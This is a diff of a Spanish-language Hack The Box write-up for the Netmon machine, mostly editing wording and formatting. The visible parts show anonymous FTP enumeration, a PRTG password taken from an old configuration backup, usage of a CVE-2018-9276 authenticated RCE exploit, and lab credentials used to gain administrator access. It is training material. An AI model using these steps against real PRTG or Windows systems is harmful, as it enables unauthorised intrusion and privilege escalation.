@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Netmon - Hack The Box
-excerpt: "Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el servicio SMB que está abierto en uno de los puertos a través de la enumeración del servicio FTP y de una vulnerabilidad en el servicio PRTG Network Monitor que nos permite inyectar código en dicho servicio."
+excerpt: "Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el servicio SMB que está abierto en uno de los puertos a través de la enumeración del servicio FTP y de una vulnerabilidad en el servicio PRTG Network Monitor que nos permite inyectar código en dicho servicio, lo que nos va a permitir crear un usuario con privilegios de administrador siendo de esta forma en la que escalamos privilegios."
 date: 2023-01-16
 classes: wide
 header:
@@ -16,17 +16,19 @@ tags:
   - SMB
   - PRTG Network Monitor
   - FTP Enumeration
-  - Remote Code Execution (Authenticated) 
+  - Remote Code Execution - Authenticated (RCE - Authenticated)
   - CVE-2018-9276
+  - Privesc - CVE-2018-9276 (RCE - Authenticated)
   - PassTheHash
   - RDP
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-netmon/netmon_logo.png)
-Esta es una máquina fácil que usa **Windows**, en la cual vamos a vulnerar el **servicio SMB** que está abierto en uno de los puertos a través de la enumeración del **servicio FTP** y de una vulnerabilidad en el **servicio PRTG Network Monitor** que nos permite inyectar código en dicho servicio.
 
+Esta es una máquina fácil que usa **Windows**, en la cual vamos a vulnerar el **servicio SMB** que está abierto en uno de los puertos a través de la enumeración del **servicio FTP** y de una vulnerabilidad en el **servicio PRTG Network Monitor** que nos permite inyectar código en dicho servicio, lo que nos va a permitir crear un usuario con privilegios de administrador siendo de esta forma en la que escalamos privilegios.
 
-Herramientas usadas:
+Herramientas utilizadas:
+* *ping*
 * *nmap*
 * *whatweb*
 * *ftp*
@@ -50,7 +52,7 @@ Herramientas usadas:
 			</ul>
 		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
 			<ul>
-				<li><a href="#HTTP">Analizando Puerto 80</a></li>
+				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
 				<li><a href="#PRTG">Información Útil del Servicio PRTG Network Monitor</a></li>
 				<li><a href="#FTP">Enumeración Servicio FTP</a></li>
 			</ul>
@@ -66,8 +68,10 @@ Herramientas usadas:
 				<li><a href="#Exploit3">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Versión Blog</a></li>
 				<li><a href="#Root">Accediendo a la Máquina como Administrador</a></li>
 				<li><a href="#Extras">Obteniendo Información Extra y Otras Formas de Acceder a la Máquina</a></li>
-				<li><a href="#psexec">Accediendo a la Máquina con Psexec</a></li>
-				<li><a href="#rdp">Accediendo a la Máquina con xfreerdp - Remmina</a></li>
+				<ul>
+					<li><a href="#psexec">Accediendo a la Máquina con Psexec</a></li>
+					<li><a href="#rdp">Accediendo a la Máquina con xfreerdp - Remmina</a></li>
+				</ul>
 			</ul>
 
 		<li><a href="#Links">Links de Investigación</a></li>
@@ -79,10 +83,7 @@ Herramientas usadas:
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
 </div>
 <br>
 
@@ -213,15 +214,12 @@ Observamos que el **servicio FTP** tiene activo el login como **Anonymous** por 
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
 </div>
 <br>
 
 
-<h2 id="HTTP">Analizando Puerto 80</h2>
+<h2 id="HTTP">Analizando Servicio HTTP</h2>
 
 Vamos a analizar la página web abierta antes de ir al **serivico FTP**, usaremos la herramienta **whatweb** para esto:
 
@@ -237,9 +235,13 @@ Nos da un curioso error, una vez que entramos a la página web vemos el servicio
 |:-----------:|
 | *PRTG es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.* |
 
+<br>
+
 ![](/assets/images/htb-writeup-netmon/Captura1.png)
 
-Osease que monitorea redes, esto es bastante útil, investiguemos un poco más. Algo que podemos investigar, es donde se guarda las carpetas de instalación de este programa, puede que ahí se almacenen contraseñas o información critica que podamos usar.
+Osease que monitorea redes, esto es bastante útil así que investiguemos un poco más. 
+
+Algo que podemos investigar, es donde se guarda las carpetas de instalación de este programa, puede que ahí se almacenen contraseñas o información critica que podamos usar.
 
 <h2 id="PRTG">Información Útil del Servicio PRTG Network Monitor</h2>
 
@@ -250,6 +252,8 @@ Osease que monitorea redes, esto es bastante útil, investiguemos un poco más. 
 | *Sistemas de 32 bits: % archivos de programa% \ PRTG Network Monitor*       | *% programdata% \ Paessler \ PRTG Network Monitor -> Almacenamiento de datos* |
 | *Sistemas de 64 bits: % archivos de programa (x86)% \ PRTG Network Monitor* |
 
+<br>
+
 **Para encontrar el camino correcto para la instalación de PRTG, por favor búsquelo en las propiedades de los iconos de PRTG el menú de inicio. Nota: Windows ProgramData está oculta por defecto.**
 
 **Ojito con lo siguiente**, los siguientes archivos se almacenan en el **directorio de datos de PRTG**:
@@ -259,15 +263,17 @@ Osease que monitorea redes, esto es bastante útil, investiguemos un poco más. 
 | *PRTG Configuration.dat*                 | Configuración de monitoreo (por ejemplo, sondas, grupos, dispositivos, sensores, usuarios, mapas, informes y más) |
 | *Configuración de PRTG.old*              | Copia de seguridad de la versión anterior de la configuración de monitoreo |
 
-**Aquí podemos ver más información:**
-* https://kb.rolosa.com/np-donde-almacena-la-informacion-prtg/
+<br>
+
+Aquí podemos ver más información:
+* <a href="https://kb.rolosa.com/np-donde-almacena-la-informacion-prtg/" target="_blank">¿Dónde almacena la información PRTG?</a>
 
 Tenemos mucha información crítica, el problema es ver si podemos revisar los archivos de la máquina, probemos primero con el **servicio FTP** y si no encontramos nada, investigaremos el **servicio SMB**.
 
 <h2 id="FTP">Enumeración Servicio FTP</h2>
 
 De acuerdo al escaneo de servicios, el **servicio FTP** tiene activo el usuario **anonymous**, para entrar es tan simple como usar el usuario **anonymous** y poner una contraseña cualquiera:
-```bash
+```batch
 ftp 10.10.10.152 
 Connected to 10.10.10.152.
 220 Microsoft FTP Service
@@ -277,8 +283,9 @@ Password:
 230 User logged in.
 Remote system type is Windows_NT.
 ```
+
 Bien, una vez dentro, vamos a investigar que hay:
-```bash
+```batch
 ftp> ls
 229 Entering Extended Passive Mode (|||50290|)
 125 Data connection already open; Transfer starting.
@@ -299,8 +306,9 @@ ftp> ls
 02-03-19  12:35AM       <DIR>          Public
 226 Transfer complete.
 ```
-Vemos que si hay datos de la máquina, es decir, que el servicio FTP no esta correctamente configurado. En los usuarios, podemos ver 2 usuarios, no creo que podamos entrar al administrador, pero al **Public** sí que podremos:
-```bash
+
+Vemos que si hay datos de la máquina, es decir, que el **servicio FTP** no esta correctamente configurado. Si te fijas en los usuarios se pueden ver 2 usuarios, no creo que podamos entrar al administrador, pero al **Public** sí que podremos:
+```batch
 ftp> cd Public
 250 CWD command successful.
 ftp> ls
@@ -323,10 +331,7 @@ Empecemos a explotar las vulnerabilidades.
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
 </div>
 <br>
 
@@ -334,7 +339,7 @@ Empecemos a explotar las vulnerabilidades.
 <h2 id="Busqueda">Buscando Archivos Críticos de PRTG en Servicio FTP</h2>
 
 Muy bien, ahora sabemos que podemos buscar dentro del **servicio FTP** para no estar dando tantas vueltas o buscando cosas que no sirven.
-```bash
+```batch
 ftp> ls -la
 229 Entering Extended Passive Mode (|||50613|)
 125 Data connection already open; Transfer starting.
@@ -385,7 +390,7 @@ Una vez dentro de la carpeta donde están los archivos ocultos, descargamos él 
 <h2 id="FTP2">Analizando Contenido Descargado del Servicio FTP</h2>
 
 Ahora toca analizar los archivos que descargamos, recuerda que buscamos un usuario y contraseña para poder acceder a la página web.
-```bash
+```xml
 cat PRTG\ Configuration.dat 
 <?xml version="1.0" encoding="UTF-8"?>
   <root version="16" oct="PRTG Network Monitor 18.1.37.13946" saved="2/26/2019 2:54:23 AM" max="2017" guid="{221B25D6-9282-418B-8364-F59561032EE3}" treeversion="0" created="2019-02-02-23-18-27" trial="42f234beedd545338910317db1fca74dbe84030f">
@@ -400,13 +405,14 @@ cat PRTG\ Configuration.dat
 ...
 ...
 ```
+
 Al hacer un **cat** al archivo **.dat** vemos que hay demasiados datos por lo que hay que analizarlos de otra forma, ya que si vemos él **.old.bak** será lo mismo, demasiados datos. Vamos a usar el comando **diff** para ver las diferencias, junto con el comando **less** para ver el **output** como una página e ir viendo poco a poco toda la información, con el fin de ver si hay alguna diferencia entre estos dos archivos:
 ```bash
 diff "PRTG Configuration.dat" "PRTG Configuration.old.bak" | less
 ```
 
 Y vemos este resultado:
-```bash
+```xml
 >       <geostat day="03-02-2019"/>
 144,146c141,142
 <               <flags>
@@ -419,7 +425,7 @@ Y vemos este resultado:
 <                 77RULO2GA4Q3RVEUZ77IMPLVKABRRS2UNR3Q====
 
 ```
-AHÍ ESTA!!! Nuestro usuario y contraseña que necesitamos, ahora vamos a autenticarnos, PERO recuerda que este es un archivo antiguo, por lo que la contraseña puede que no sea correcta, trata de sumarle un año más a la contraseña para que puedas acceder:
+Ahí estan nuestro usuario y contraseña que necesitamos, ahora vamos a autenticarnos, PERO recuerda que este es un archivo antiguo, por lo que la contraseña puede que no sea correcta, trata de sumarle un año más a la contraseña para que puedas acceder:
 
 ![](/assets/images/htb-writeup-netmon/Captura2.png)
 
@@ -428,10 +434,7 @@ AHÍ ESTA!!! Nuestro usuario y contraseña que necesitamos, ahora vamos a autent
 <br>
 <hr>
 <div style="position: relative;">
- <h1 id="Post" style="text-align:center;">Post Explotación</h1>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h1 id="Post" style="text-align:center;">Post Explotación</h1>
 </div>
 <br>
 
@@ -452,6 +455,7 @@ PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                         
 Shellcodes: No Results
 Papers: No Results
 ```
+
 Vamos a analizar este Exploit: **PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution**.
 ```bash
 ./Remote_Code_Execution.sh
@@ -475,11 +479,14 @@ Vamos a analizar este Exploit: **PRTG Network Monitor 18.2.38 - (Authenticated) 
 [+]#########################################################################[+] 
  EXAMPLE USAGE: ./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1"
 ```
+
 El Exploit nos pide unas cookies, que podemos ver si inspeccionamos la página web y nos vamos a la sección de storage:
 
 <p align="center">
 <img src="/assets/images/htb-writeup-netmon/Captura9.png">
 </p>
+
+<br>
 
 <h2 id="Exploit2">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</h2>
 
@@ -530,8 +537,9 @@ SMB         10.10.10.152    445    NETMON           [-] netmon\pentest:P3nT3st! 
 No dio resultado, es probable que esto sea así por la versión que maneja el Exploit y la que esta usando la máquina, así que vamos a probar de otra manera.
 
 Existe un blog que explica como fue posible vulnerar esta versión del PRTG, incluso viene la referencia del blog en la que se basó el Exploit que acabamos de usar, así que veamos dicho blog y probemos esa forma: 
-* https://www.codewatch.org/blog/?p=453
+* <a href="https://www.codewatch.org/blog/?p=453" target="_blank">PRTG < 18.2.39 Command Injection Vulnerability</a>
 
+<br>
 
 <h2 id="Exploit3">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Versión Blog</h2>
 
@@ -576,6 +584,7 @@ crackmapexec smb 10.10.10.152 -u 'BerserkP' -p 'B3rs3rkP123$!'
 SMB         10.10.10.152    445    NETMON           [*] Windows Server 2016 Standard 14393 x64 (name:NETMON) (domain:netmon) (signing:False) (SMBv1:True)
 SMB         10.10.10.152    445    NETMON           [+] netmon\BerserkP:B3rs3rkP123$! (HackeadoPrro!)
 ```
+
 <h2 id="Root">Accediendo a la Máquina como Administrador</h2>
 
 Vemos que ya está nuestro usuario, ahora lo que sigue será conectarnos ya directamente, para esto usaremos la herramienta **evilWinrm**:
@@ -653,6 +662,8 @@ nt authority\system
 
 Listo, ganamos acceso utilizando la herramienta **psexec.py**.
 
+<br>
+
 <h3 id="rdp">Accediendo a la Máquina con xfreerdp - Remmina</h3>
 
 Para este caso, vamos a primero levantar el **servicio RDP** utilizando **Crackmapexec**, para esto tambien puedes usar el usuario administrador y su hash o tu usuario, queda a tu elección:
@@ -719,22 +730,63 @@ Y listo, nos hemos conectado a la máquina:
 <br>
 <br>
 <div style="position: relative;">
- <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
-  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
-   <a href="#Indice">Volver al Índice</a>
-  </button>
+	<h2 id="Links" style="text-align:center;">Links de Investigación</h2>
 </div>
 
 
 * https://www.cvedetails.com/cve/CVE-2018-9276/
-* https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html **Nota:** Aquí hay varios Exploits para usar contra la versión de este servicio.
+* https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html
 * https://packetstormsecurity.com/files/148334/PRTG-Command-Injection.html 
 * https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/
 * https://www.mundodeportivo.com/urbantecno/windows/agrega-un-usuario-al-grupo-de-administradores-local-en-windows-via-comando
 * https://www.ngi.es/crackmapexec-post-explotacion-entornos-active-directory/
 * https://thehackerway.com/2021/11/04/evil-winrm-shell-sobre-winrm-para-pentesting-en-sistemas-windows-parte-1-de-2/
-* https://www.youtube.com/watch?v=aPS0VIIL0nQ
 
 
 <br>
 # FIN
+
+<footer id="myFooter">
+    <!-- Footer para eliminar el botón -->
+</footer>
+
+<style>
+        #backToIndex {
+                display: none;
+                position: fixed;
+                left: 87%;
+                top: 90%;
+                z-index: 2000;
+                background-color: #81fbf9;
+                border-radius: 10px;
+                border: none;
+                padding: 4px 6px;
+                cursor: pointer;
+        }
+</style>
+
+<a id="backToIndex" href="#Indice">
+        <img src="/assets/images/arrow-up.png" style="width: 45px; height: 45px;">
+</a>
+
+<script>
+    window.onscroll = function() { showButton() };
+
+    function showButton() {
+        const scrollPosition = document.documentElement.scrollTop || document.body.scrollTop;
+        const indicePosition = document.getElementById("Indice").offsetTop;
+        const footerPosition = document.getElementById("myFooter").offsetTop;
+        const windowHeight = window.innerHeight;
+
+        const button = document.getElementById("backToIndex");
+
+        // Mostrar el botón si el usuario ha bajado al índice
+        if (scrollPosition >= indicePosition && (scrollPosition + windowHeight) < footerPosition) {
+            button.style.display = "block";
+            button.style.position = "fixed";
+            button.style.top = "90%";
+        } else {
+            button.style.display = "none";
+        }
+    }
+</script>
